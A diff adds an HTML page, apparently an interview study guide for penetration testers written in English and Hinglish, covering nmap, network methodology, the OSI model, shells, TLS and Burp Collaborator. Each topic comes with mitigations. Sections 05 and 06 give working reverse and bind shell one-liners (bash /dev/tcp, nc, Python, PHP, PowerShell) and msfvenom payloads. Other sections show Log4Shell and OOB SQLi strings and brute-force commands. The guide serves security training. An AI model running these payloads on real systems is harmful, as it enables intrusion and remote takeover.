@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pentest Interview Master Guide — Part 2 (Network, Process, Mobile OS &amp; Misc)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}
+header{background:#161b22;border-bottom:1px solid #30363d;padding:16px 24px;position:sticky;top:0;z-index:10;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+h1{color:#58a6ff;font-size:1.25rem;flex:1;min-width:220px}
+#q{background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:8px 12px;border-radius:8px;width:280px;font-size:.9rem}
+#q:focus{outline:1px solid #58a6ff}
+#count{color:#8b949e;font-size:.8rem;white-space:nowrap}
+.btn{background:#238636;color:#fff;border:none;padding:8px 14px;border-radius:8px;cursor:pointer;font-size:.85rem;font-weight:600}
+.btn:hover{background:#2ea043}
+.wrap{display:flex;align-items:flex-start}
+nav{width:300px;position:sticky;top:74px;max-height:calc(100vh - 90px);overflow:auto;padding:16px;border-right:1px solid #30363d;flex-shrink:0}
+nav .cat{color:#f0883e;font-weight:700;font-size:.72rem;text-transform:uppercase;letter-spacing:1px;margin:14px 0 4px}
+nav a{display:block;color:#8b949e;text-decoration:none;padding:3px 8px;border-radius:6px;font-size:.82rem;border-left:2px solid transparent}
+nav a:hover{background:#21262d;color:#58a6ff;border-left-color:#58a6ff}
+main{flex:1;padding:24px;max-width:960px;min-width:0}
+.intro{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px 20px;margin-bottom:20px;font-size:.92rem}
+.intro b{color:#58a6ff}
+.category{color:#f0883e;font-weight:800;margin:28px 0 10px;text-transform:uppercase;font-size:.85rem;letter-spacing:1.5px;border-bottom:1px solid #30363d;padding-bottom:6px}
+.topic{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px 20px;margin-bottom:16px}
+.topic h2{color:#e6edf3;font-size:1.08rem;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:8px}
+.topic h2 .n{color:#f0883e;margin-right:8px;font-weight:800}
+.def{border-left:3px solid #58a6ff;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.impact{border-left:3px solid #f85149;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.mit{border-left:3px solid #3fb950;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.tc{border-left:3px solid #d29922;padding-left:12px;margin-bottom:10px;font-size:.93rem}
+.sc{border-left:3px solid #bc8cff;padding-left:12px;font-size:.93rem}
+.lbl{display:inline-block;font-size:.68rem;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:#0d1117;padding:1px 8px;border-radius:10px;margin-bottom:3px}
+.lbl.ld{background:#58a6ff}.lbl.li{background:#f85149}.lbl.lm{background:#3fb950}.lbl.lt{background:#d29922}.lbl.ls{background:#bc8cff}
+ul{margin:4px 0 4px 20px}
+li{margin:3px 0}
+code{background:#0d1117;border:1px solid #30363d;padding:1px 6px;border-radius:5px;color:#79c0ff;font-size:.85em;word-break:break-all}
+footer{color:#8b949e;font-size:.8rem;text-align:center;padding:20px}
+@media(max-width:860px){.wrap{flex-direction:column}nav{position:static;width:auto;max-height:none;border-right:none;border-bottom:1px solid #30363d}}
+</style>
+</head>
+<body>
+<header>
+  <h1>Pentest Interview Master Guide — Part 2</h1>
+  <input id="q" type="text" placeholder="Search topics (e.g. nmap, osi, shells, nessus, swift)...">
+  <span id="count">50 topics</span>
+  <button class="btn" onclick="window.print()">Print / PDF</button>
+</header>
+<div class="wrap">
+<nav>
+  <div class="cat">Network &amp; Infrastructure</div>
+  <a href="#t01">01. Nmap — Open vs Closed vs Filtered</a>
+  <a href="#t02">02. Nmap — Top Ports &amp; Exploitation</a>
+  <a href="#t03">03. Network Pentest Approach</a>
+  <a href="#t04">04. OSI Model — 7 Layers</a>
+  <a href="#t05">05. Bind vs Reverse Shell</a>
+  <a href="#t06">06. Shell Payloads</a>
+  <a href="#t07">07. Wireshark vs Burp — HTTPS Encrypted?</a>
+  <a href="#t08">08. SSL/TLS Handshake</a>
+  <a href="#t09">09. Expired SSL Certificate Risk</a>
+  <a href="#t10">10. Burp Collaborator</a>
+  <a href="#t11">11. DNS Misconfig &amp; Subdomain Takeover</a>
+  <a href="#t12">12. RMI Injection</a>
+  <a href="#t13">13. Honeypot</a>
+  <div class="cat">Testing Process &amp; Tools</div>
+  <a href="#t14">14. Social Engineering Attacks</a>
+  <a href="#t15">15. WSDL &amp; SOAP Testing</a>
+  <a href="#t16">16. VAPT Methodology (Web)</a>
+  <a href="#t17">17. SDLC &amp; Secure SDLC</a>
+  <a href="#t18">18. Nessus — Usage</a>
+  <a href="#t19">19. Thick Client Vulnerabilities</a>
+  <a href="#t20">20. Thick Client Memory Dump</a>
+  <a href="#t21">21. Web App Security Tools</a>
+  <a href="#t22">22. Burp Suite Modules &amp; Workflow</a>
+  <a href="#t23">23. Intruder vs Repeater</a>
+  <a href="#t24">24. Four Intruder Attack Types</a>
+  <a href="#t25">25. Rate Limiting — Implementation</a>
+  <a href="#t26">26. VACA (VA &amp; Config Audit)</a>
+  <a href="#t27">27. Interesting / Critical Findings</a>
+  <a href="#t28">28. High-Severity Finding — Walkthrough</a>
+  <div class="cat">Mobile &amp; OS</div>
+  <a href="#t29">29. Android Vulnerabilities — Full List</a>
+  <a href="#t30">30. Integrity &amp; SDK Checks</a>
+  <a href="#t31">31. Runtime Root Checks — Mitigation</a>
+  <a href="#t32">32. Root/SSL Bypass Tools (Android &amp; iOS)</a>
+  <a href="#t33">33. How to Root Android</a>
+  <a href="#t34">34. Manual Static Settings Modification</a>
+  <a href="#t35">35. iOS — Swift vs Objective-C</a>
+  <a href="#t36">36. Mobile Testing Approach</a>
+  <div class="cat">Crypto &amp; Misc</div>
+  <a href="#t37">37. Why MD5 Is Weak</a>
+  <a href="#t38">38. Password Cracking — hashcat &amp; John</a>
+  <a href="#t39">39. CSRF Token — Where to Pass</a>
+  <a href="#t40">40. OSINT — Passive Recon</a>
+  <a href="#t41">41. Logging &amp; Monitoring</a>
+  <a href="#t42">42. Security Misconfiguration (A05)</a>
+  <a href="#t43">43. HTTP vs HTTPS — Why HTTPS Only</a>
+  <a href="#t44">44. SQLmap — Flags &amp; Automation</a>
+  <a href="#t45">45. Subdomain Enumeration</a>
+  <a href="#t46">46. CAPTCHA vs 2FA</a>
+  <a href="#t47">47. API Gateway Security</a>
+  <a href="#t48">48. JWT vs Session Tokens</a>
+  <a href="#t49">49. DNS Sinkhole &amp; SSRF Bypass</a>
+  <div class="cat">Revision</div>
+  <a href="#t50">50. Quick Revision Cheat Sheet</a>
+</nav>
+
+<main>
+<div class="intro"><b>How to use:</b> Part 2 covers Network/Infra, Testing process &amp; tools, Thick clients, Mobile OS internals, Crypto &amp; Misc — same format: <b>Definition, Impact, Mitigation (5 points), Test Cases (Hinglish), Real-world Scenario</b>. Search box filters, Print/PDF for offline revision. Part 1 (Web/API/Mobile app vulns) + Part 2 = complete coverage of your question list.</div>
+
+<!-- ==================== NETWORK & INFRASTRUCTURE ==================== -->
+<h3 class="category">Network &amp; Infrastructure</h3>
+
+<section class="topic" id="t01">
+<h2><span class="n">01</span>Nmap — Open vs Closed vs Filtered Ports</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Open:</b> port accept karta hai (SYN-ACK mila) — service listening hai, exploitable surface. <b>Closed:</b> port reachable hai par koi service nahi (RST reply) — host alive confirm hota hai, OS fingerprinting mein madad karta hai, par direct attack surface nahi. <b>Filtered:</b> firewall/IPS packet drop karta hai (no response ya ICMP unreachable) — nmap ko status pata nahi chalta, <code>--reason</code> se cause dekho.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Open ports = entry points (RCE, weak creds, known CVEs). Closed vs Filtered distinction batati hai ki firewall hai ya nahi — filtered ports ka matlab host ke aage filtering hai, wahan evasion techniques chahiye (fragmentation, decoys, timing).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Firewall: sirf required ports allow (default deny inbound).</li>
+<li>Host hardening: unnecessary services band karo.</li>
+<li>IDS/IPS: scan detection (port scan signatures) + alerting.</li>
+<li>Rate-limit connection attempts (fail2ban style) for exposed services.</li>
+<li>Network segmentation: internal ports public exposure mein nahi.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>nmap -sS -p- -T4 target</code> — full SYN scan; open ports note karo.</li>
+<li>Closed port verify: <code>nmap -sS -p 9999 target</code> — RST response aata hai? (host alive).</li>
+<li>Filtered check: <code>nmap -sA target</code> — ACK scan se filtered ports alag dikhte hain.</li>
+<li><code>nmap --reason -p 22,80 target</code> — har port ka exact reason (syn-ack / rst / no-response).</li>
+<li>Evasion: <code>-f</code> (fragmented), <code>-D RND:5</code> (decoys), <code>-T1</code> (slow) — firewall bypass attempt.</li>
+<li><code>nmap -O target</code> — closed port responses se OS fingerprint.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>External scan mein 445 filtered tha, 22 open — filtered port ne bataya ki host firewall ke peeche hai. Open SSH par weak creds mile → bastion compromised → internal pivot. Lesson: open ports hi real attack surface hain.</div>
+</section>
+
+<section class="topic" id="t02">
+<h2><span class="n">02</span>Nmap — Top Ports &amp; Exploitation Test Cases</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Top ports aur unke typical attacks: <b>21 FTP</b> — anonymous login, vsftpd 2.3.4 backdoor; <b>22 SSH</b> — weak creds (hydra), libssh/OpenSSH CVEs; <b>23 Telnet</b> — plaintext creds; <b>25 SMTP</b> — VRFY/EXPN user enum, open relay; <b>53 DNS</b> — zone transfer, cache poisoning; <b>80/443 HTTP/S</b> — web app vulns; <b>110/143 POP3/IMAP</b> — weak auth; <b>135/139/445 SMB</b> — MS17-010 EternalBlue, null session, SMB relay, psexec; <b>389/636 LDAP</b> — anonymous bind; <b>1433 MSSQL</b> — weak sa, xp_cmdshell; <b>3306 MySQL</b> — weak creds, UDF RCE; <b>3389 RDP</b> — BlueKeep CVE-2019-0708, cred spray; <b>5432 PostgreSQL</b> — weak creds; <b>6379 Redis</b> — unauth RCE (cron/ssh key); <b>5985/5986 WinRM</b> — evil-winrm; <b>9200 Elasticsearch</b> — unauth data; <b>27017 MongoDB</b> — unauth DB.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Ek open unpatched service = RCE/breach. DB ports (3306/6379/27017) bina auth = full data theft. SMB/RDP = wormable/ransomware paths (EternalBlue, BlueKeep).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Close unused ports; expose DB ports never publicly.</li>
+<li>Patch critical CVEs (MS17-010, BlueKeep) immediately.</li>
+<li>Strong auth: disable anonymous, MFA on remote access.</li>
+<li>Network ACLs: DB/admin ports internal-only + VPN.</li>
+<li>Monitor: auth failures, unauth service access logs.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Har open port par <code>-sV --version-light</code> — service + version, phir <code>searchsploit</code> se CVE check.</li>
+<li>FTP: <code>ftp target</code> → anonymous/anonymous login try karo.</li>
+<li>SMB: <code>enum4linux -a target</code> (null session), <code>nmap --script smb-vuln-ms17-010</code>.</li>
+<li>Redis: <code>redis-cli -h target info</code> — bina password connect hota hai? SSH key write test.</li>
+<li>MSSQL: <code>hydra -l sa -P rockyou.txt target mssql</code>; login ke baad <code>xp_cmdshell</code>.</li>
+<li>RDP: <code>nmap --script rdp-vuln-ms12-020</code>; cred spray with <code>crowbar</code>.</li>
+<li>Elasticsearch: <code>curl http://target:9200/_cat/indices</code> — data accessible?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>E-commerce company ka MongoDB 27017 public par tha bina auth — shodan se mila → 2 crore customer records dump. Fix: port close + auth + network ACL.</div>
+</section>
+
+<section class="topic" id="t03">
+<h2><span class="n">03</span>Network Pentest — Approach &amp; Methodology</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Structured flow: <b>1. Scope &amp; ROE</b> (IP ranges, exclusions, timing) → <b>2. Discovery</b> (ping sweep, DNS, ARP) → <b>3. Port scan</b> (top 1000 → full -p-) → <b>4. Service fingerprinting</b> (-sV, banners) → <b>5. Vulnerability mapping</b> (nmap vulners, searchsploit, CVE DB) → <b>6. Exploitation</b> (manual + Metasploit) → <b>7. Post-exploitation</b> (priv esc, lateral movement, persistence) → <b>8. Reporting</b> (evidence, CVSS, remediation). Internal vs external testing alag strategy: external = perimeter/firewall; internal = segmentation, ARP/DHCP attacks, relay.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Methodology follow karne se no missed services, reproducible findings, aur professional reporting. Ad-hoc testing = false negatives + dangerous impact.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Phase-wise testing with written scope (avoid legal/ops issues).</li>
+<li>Least-intrusive first: passive → active; avoid DoS without approval.</li>
+<li>Timebox scans; coordinate with client ops team (prod systems).</li>
+<li>Keep evidence: raw scan outputs, screenshots, timestamps.</li>
+<li>Report: executive summary + technical detail + fix guidance.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Discovery: <code>nmap -sn 10.10.0.0/24</code> — live hosts.</li>
+<li>Full scan: <code>nmap -sS -p- -T4 -oA full target</code>.</li>
+<li>Services: <code>nmap -sV -sC -oA svc target</code> — version + default scripts.</li>
+<li>Vuln mapping: <code>nmap --script vulners</code> / <code>searchsploit openssh 7.2</code>.</li>
+<li>Exploit: Metasploit <code>use exploit/...</code> ya manual PoC (authorized).</li>
+<li>Priv esc: <code>sudo -l</code>, <code>uname -a</code>, kernel exploits, SUID files.</li>
+<li>Lateral: stolen creds se <code>crackmapexec smb 10.10.0.0/24 -u user -p pass</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Internal test: 192.168.x.x par port scan → 445 open → null session se user enum → weak password spray → domain admin. Full chain external-to-internal documented with screenshots for report.</div>
+</section>
+
+<section class="topic" id="t04">
+<h2><span class="n">04</span>OSI Model — 7 Layers Explained</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>L1 Physical:</b> bits, cables, hubs — attacks: cable tap, jamming. <b>L2 Data Link:</b> frames, MAC, switches — attacks: ARP spoofing, MAC flooding, VLAN hopping (DTP abuse). <b>L3 Network:</b> packets, IP, routers — attacks: IP spoofing, ICMP redirect, Smurf DDoS. <b>L4 Transport:</b> TCP/UDP, ports — attacks: SYN flood, port scanning, session hijacking. <b>L5 Session:</b> session establishment/management — attacks: session hijacking/fixation (NetBIOS, RPC). <b>L6 Presentation:</b> encoding, encryption (SSL/TLS) — attacks: SSL stripping, downgrade attacks. <b>L7 Application:</b> HTTP, DNS, SMTP, FTP — attacks: SQLi, XSS, XXE, SSRF, command injection.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Har layer ke apne attacks aur controls hain — layered security (defense in depth) har layer par controls maangti hai. L2 attacks (ARP spoof) = MITM without any app vulnerability.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>L1-L2: port security, 802.1X, dynamic ARP inspection, DHCP snooping.</li>
+<li>L3: IPsec, ingress/egress filtering (BCP38 anti-spoof).</li>
+<li>L4: firewalls, rate limiting, SYN cookies (tcp_syncookies).</li>
+<li>L5-L6: TLS everywhere, secure session IDs, HSTS.</li>
+<li>L7: WAF, input validation, patching, app-level authN/authZ.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>L2: <code>bettercap</code> se ARP spoof karke traffic sniff karo (authorized lab).</li>
+<li>L2: MAC flooding (<code>macof</code>) — switch fails open? VLAN hopping (<code>yersinia</code> DTP).</li>
+<li>L3: spoofed source IP packets — router filter karta hai? (BCP38 test).</li>
+<li>L4: <code>hping3 -S -p 80 --flood</code> — SYN flood se service down? (authorized DoS test).</li>
+<li>L6: SSL strip test — HSTS missing par HTTP redirect? (bettercap/responder).</li>
+<li>L7: web app OWASP checklist (Part 1 topics).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>ARP spoof se office LAN par employee ka HTTPS traffic MITM hua (before HSTS) → login creds capture. Fix: 802.1X + HSTS + TLS everywhere.</div>
+</section>
+
+<section class="topic" id="t05">
+<h2><span class="n">05</span>Bind vs Reverse Shell — Differences</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Bind shell:</b> victim par listener chalta hai (port kholta hai), attacker usse connect karta hai — <code>nc -lvnp 4444 -e /bin/bash</code> (victim) → <code>nc 10.10.10.5 4444</code> (attacker). <b>Reverse shell:</b> victim attacker ke listener par outbound connect karta hai — <code>nc -lvnp 4444</code> (attacker) → victim chalata hai <code>bash -i &gt;&amp; /dev/tcp/10.10.10.1/4444 0&gt;&amp;1</code>. <b>Difference:</b> direction of connection; bind = inbound (firewall ingress blocks), reverse = outbound (egress usually open — isliye pentests mein reverse preferred). Bind ko target IP pata hona chahiye; reverse mein attacker IP chahiye.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Dono = remote code execution access. Bind fail hota hai inbound-filtered networks par; reverse fail hota hai outbound-filtered (strict egress) networks par — dono techniques aani chahiye.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Egress filtering: allow only required outbound ports (reverse shells block).</li>
+<li>Ingress firewall: no random inbound ports (bind shells block).</li>
+<li>Host IPS/EDR: detect nc/powershell outbound anomalies, shell parent-child chains.</li>
+<li>Application allowlisting (bash/python in web context?).</li>
+<li>Monitor outbound connections to unknown IPs (SIEM alerts).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Bind: victim <code>nc -lvnp 4444 -e /bin/bash</code>; attacker <code>nc target 4444</code>.</li>
+<li>Reverse: attacker <code>nc -lvnp 4444</code>; victim payload (next topic) bhejo.</li>
+<li>Firewall test: inbound 4444 blocked? reverse try karo — kaunsa kaam karta hai.</li>
+<li>Egress test: outbound 4444 blocked? bind try karo.</li>
+<li>Detection test: EDR reverse shell flag karta hai? (authorized lab).</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>DMZ web server par RCE mila — inbound ports blocked, isliye bind shell fail hua; reverse shell to attacker's VPS (port 443) se firewall bypass hua kyunki outbound HTTPS allowed tha.</div>
+</section>
+
+<section class="topic" id="t06">
+<h2><span class="n">06</span>Shell Payloads — Reverse &amp; Bind (Multi-Language)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Common one-liners: <b>Bash reverse:</b> <code>bash -i &gt;&amp; /dev/tcp/10.10.10.1/4444 0&gt;&amp;1</code>; <b>Netcat:</b> <code>nc -e /bin/sh 10.10.10.1 4444</code>; <b>Python:</b> <code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code>; <b>PHP:</b> <code>php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>; <b>PowerShell (Windows):</b> <code>powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$s.Write(($r+$p),0,(($r+$p).Length))}"</code>; <b>msfvenom:</b> <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o shell.elf</code>, <code>-p windows/x64/meterpreter/reverse_tcp</code>, <code>-p php/meterpreter_reverse_tcp</code>, <code>-p android/meterpreter/reverse_tcp</code>. Stabilize: <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> + <code>socat</code>.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Working payload = shell access = system compromise. Payload generation + staging is core to exploitation phase.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Egress allowlist — reverse shells ka main defence.</li>
+<li>EDR: shell parent-child detection, powershell logging (ScriptBlock), AMSI.</li>
+<li>Application control: block bash/python/powershell in web contexts.</li>
+<li>Least privilege service accounts (shell bhi low-priv mile).</li>
+<li>Network anomaly detection: new outbound connections to unusual IPs.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>msfvenom list: <code>msfvenom -l payloads | grep shell</code>.</li>
+<li>Linux: bash/nc/python reverse payloads test karo (lab VM).</li>
+<li>Windows: PowerShell payload + <code>nc -lvnp 4444</code> listener.</li>
+<li>Encoding/evasion: <code>msfvenom -e x86/shikata_ga_nai -i 5</code> — AV detect hota hai?</li>
+<li>Bind variant: <code>msfvenom -p linux/x64/shell_bind_tcp LPORT=4444</code>.</li>
+<li>Stabilize: python pty spawn + <code>socat file:`tty`,raw,echo=0 tcp:...</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>File upload RCE mila — PHP reverse shell uploaded, attacker listener par shell mila, python se TTY stabilize karke interactive access → lateral movement chain start.</div>
+</section>
+
+<section class="topic" id="t07">
+<h2><span class="n">07</span>Wireshark vs Burp — Why Is the Request Encrypted in Wireshark?</h2>
+<div class="def"><span class="lbl ld">Definition</span><br><b>Burp Suite</b> ek <b>MITM proxy</b> hai — browser Burp par HTTP bhejta hai, Burp TLS terminate karke request plaintext mein dikhata hai (browser Burp ke CA par trust karta hai), phir Burp server se naya TLS connection banata hai. Isliye Burp mein request readable hai. <b>Wireshark</b> wire par raw packets dekhta hai — client aur server ke beech ka <b>actual TLS ciphertext</b>; bina private key / session keys ke payload readable nahi hota. Encryption client↔server ke beech hai, Burp ke beech nahi.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Yeh difference samajhna zaroori hai: Wireshark mein "encrypted" dekh kar confusion nahi honi chahiye — TLS working hai. Burp ka CA install na hone par app/TLS fail hota hai (pinning scenario).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>TLS everywhere: HTTPS + HSTS (Wireshark capture mein data safe).</li>
+<li>Certificate validation: users/apps CA spoofing se bachein (pinning).</li>
+<li>Never fall back to HTTP; disable legacy protocols.</li>
+<li>Encrypt sensitive fields end-to-end (beyond TLS) for high-risk apps.</li>
+<li>Monitoring: TLS inspection at perimeter (corporate proxy) only with policy.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Wireshark capture karo HTTPS traffic — payload bytes encrypted dikhte hain?</li>
+<li>Decrypt: browser <code>SSLKEYLOGFILE</code> env var set karo, Wireshark → TLS → (Pre)-Master-Secret log — ab plaintext dikhta hai.</li>
+<li>Burp: browser proxy set karo + CA install — request plaintext dikhti hai (compare Wireshark se).</li>
+<li>RSA key import (non-PFS cipher) se decrypt demo karo.</li>
+<li>Verify: Wireshark mein TLS version + cipher suite (ClientHello) inspect karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Interview/technical scenario: Wireshark mein login POST encrypted dikha — galat conclusion "app secure hai". Asli check: Burp se plaintext request mein credentials + tokens the, aur server ne 301 redirect ke baad bhi HTTP allow kiya — MITM risk real tha.</div>
+</section>
+
+<section class="topic" id="t08">
+<h2><span class="n">08</span>SSL/TLS Handshake — How Encryption Works</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>TLS 1.2 handshake: <b>ClientHello</b> (TLS version, cipher suites, random) → <b>ServerHello</b> (chosen cipher, random, session ID) → <b>Certificate</b> (server public key + signature) → <b>Key Exchange</b> (ECDHE — ephemeral keys) → <b>Finished</b> (both sides verify) → ab <b>symmetric encryption (AES-GCM)</b> se application data flow. <b>TLS 1.3:</b> 1-RTT, fewer round trips, only AEAD ciphers, forward secrecy default (ECDHE mandatory). <b>Kyun dono?</b> Asymmetric (RSA/ECDHE) slow — sirf identity + key exchange ke liye; symmetric (AES/ChaCha20) fast — bulk data ke liye.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>Handshake flaws = downgrade attacks (POODLE, BEAST, SSL striping), key theft (Heartbleed), weak ciphers (RC4/DES). Certificate validation failure = MITM.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Use TLS 1.2+ (disable 1.0/1.1, SSLv3).</li>
+<li>Configure strong ciphers: ECDHE + AES-GCM/ChaCha20 (forward secrecy).</li>
+<li>Valid certificates + HSTS + OCSP stapling.</li>
+<li>Patch TLS libraries (OpenSSL Heartbleed class bugs).</li>
+<li>Regular TLS audits (testssl.sh / Qualys SSL Labs).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li><code>openssl s_client -connect target:443 -tls1_2</code> — cipher + cert details dekho.</li>
+<li><code>testssl.sh target</code> — cipher strength, protocols, vulnerabilities scan.</li>
+<li>Downgrade test: <code>openssl s_client -tls1</code> — TLS 1.0 accept hota hai?</li>
+<li>Weak cipher test: RC4/3DES supported hai? (Qualys SSL Labs grade check).</li>
+<li>Cert chain: <code>openssl s_client -showcerts</code> — chain valid + trusted?</li>
+<li>Heartbleed: <code>nmap --script ssl-heartbleed target</code>.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Legacy server TLS 1.0 + RC4 support karta tha — BEAST/POODLE class attacks se session decrypt possible. Qualys grade F mila → patch karke TLS 1.2+ only kiya.</div>
+</section>
+
+<section class="topic" id="t09">
+<h2><span class="n">09</span>Expired SSL Certificate — Risk (Tunnel Is Still Encrypted!)</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Expired certificate ka matlab <b>encryption band nahi hai</b> — TLS tunnel ab bhi encrypted hai. Problem hai <b>identity/trust</b>: browser certificate validity verify nahi kar sakta, isliye warning dikhata hai. User warning bypass karta hai → attacker apna (attacker-controlled) certificate usi site par daal sakta hai → <b>MITM</b> possible. Extra: service outages (APIs strict validation karte hain), compliance violations (PCI-DSS requires valid certs), trust erosion.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>MITM/phishing (users click through warnings), API failures, PCI/compliance findings, automated scanners flag it (Medium).</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Automate renewal: ACME/Let's Encrypt, cert manager.</li>
+<li>Certificate expiry monitoring/alerting (90/30/7 days).</li>
+<li>Central certificate inventory + ownership per team.</li>
+<li>Short-lived certs (90 days) reduce expiry risk.</li>
+<li>Internal CAs: auto-renewal + audit reports.</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Check expiry: <code>echo | openssl s_client -connect target:443 2&gt;/dev/null | openssl x509 -noout -dates</code>.</li>
+<li>Browser kholo — certificate warning aati hai? (expired/self-signed?)</li>
+<li>API client strict validation karta hai? (curl -k vs without — failure test).</li>
+<li>HSTS active hai? — warning bypass ke baad bhi HTTPS force?</li>
+<li>Nessus/Qualys scan mein "SSL Certificate Expired" finding check karo.</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Banking portal ka cert 3 din expire hua — users "proceed anyway" kar rahe the; attacker ne same hostname par rogue cert use karke login phish kiya. Fix: ACME auto-renewal + monitoring.</div>
+</section>
+
+<section class="topic" id="t10">
+<h2><span class="n">10</span>Burp Collaborator — Use Cases</h2>
+<div class="def"><span class="lbl ld">Definition</span><br>Burp Collaborator ek <b>OOB (out-of-band) interaction server</b> hai — Burp tumhe ek unique subdomain deta hai (<code>xyz.oastify.com</code>); target server jab us domain par DNS/HTTP/SMTP request karta hai to Burp par interaction record hota hai. <b>Use cases:</b> blind SSRF detection, blind XXE, blind/time-independent SQLi (OOB via xp_dirtree/LOAD_FILE), Log4Shell (<code>${jndi:ldap://collab}</code>), header injection callbacks, email/HTML rendering callbacks, template injection probes, host header attacks.</div>
+<div class="impact"><span class="lbl li">Impact</span><br>OOB techniques se aisi blind vulnerabilities confirm hoti hain jo response mein kabhi signal nahi detin — SSRF/XXE/SQLi jo normal testing mein miss ho jaati hain.</div>
+<div class="mit"><span class="lbl lm">Mitigation (5 points)</span><ul>
+<li>Egress filtering — OOB exfiltration ka main defence.</li>
+<li>Disable external entities (XXE), validate URLs (SSRF).</li>
+<li>Parameterized queries (SQLi root fix) — OOB bhi band.</li>
+<li>Log4j/3rd-party: patch + <code>-Dlog4j2.formatMsgNoLookups=true</code> class controls.</li>
+<li>Monitor outbound DNS/HTTP from servers (SIEM alerts).</li></ul></div>
+<div class="tc"><span class="lbl lt">Test Cases (Hinglish)</span><ul>
+<li>Collaborator client kholo → subdomain copy karo.</li>
+<li>Blind SSRF: <code>url=http://collab.oastify.com</code> — DNS interaction aata hai?</li>
+<li>Blind XXE: external DTD with parameter entity → data collab par exfil.</li>
+<li>OOB SQLi (MSSQL): <code>'; EXEC xp_dirtree '\\collab\a'--</code> — DNS hit?</li>
+<li>Log4Shell: <code>${jndi:ldap://collab/a}</code> header/param mein — interaction?</li>
+<li>HTML injection: email template mein <code>&lt;img src="http://collab/x"&gt;</code> — open hua?</li></ul></div>
+<div class="sc"><span class="lbl ls">Real-world Scenario</span><br>Blind SSRF in image URL fetch — response kabhi internal data nahi dikhata tha; Collaborator DNS interaction se confirm hua → metadata endpoint fetch karke IAM keys nikaale.</div>
+</section>
+
+<section class="topic" id="t11">
